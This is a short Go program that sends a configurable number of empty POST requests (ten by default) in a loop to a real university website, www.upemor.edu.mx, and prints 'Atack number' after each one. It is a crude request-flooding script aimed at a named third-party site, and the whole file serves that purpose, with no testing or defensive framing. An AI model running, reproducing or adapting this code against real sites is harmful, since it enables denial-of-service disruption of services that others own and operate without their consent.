package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
)

func main() {
	nTimes := getNtimes()

	for i := 0; i < nTimes; i++ {

		_, err := http.Post("https://www.upemor.edu.mx/", "", nil)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Printf("Atack number %v \n", i)

	}

}

func getNtimes() int {
	v := os.Getenv("times")
	n, err := strconv.Atoi(v)
	if err != nil {
		return 10
	}

	return n
}
